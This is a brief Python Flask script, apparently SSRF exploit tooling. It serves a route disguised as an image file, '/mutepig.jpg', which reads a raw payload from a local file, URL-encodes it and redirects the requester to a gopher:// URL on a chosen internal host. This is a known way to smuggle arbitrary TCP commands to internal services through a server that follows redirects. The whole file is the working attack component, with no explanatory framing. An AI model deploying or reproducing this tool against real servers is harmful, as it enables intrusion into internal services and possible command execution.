#!/usr/bin/python
#! coding: utf-8

from flask import Flask, redirect
import urllib
app = Flask(__name__)
#host = "192.168.213.199:12000"
host = "0.0.0.0:10000"

@app.route("/mutepig.jpg")
def mutepig():
    print "="*50
    cmd = open('cmd.txt').read().strip()
    print cmd
    cmd = urllib.quote(cmd)
    print cmd
    return redirect("gopher://%s/_%s" % (host, cmd))

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=6000, debug=True)
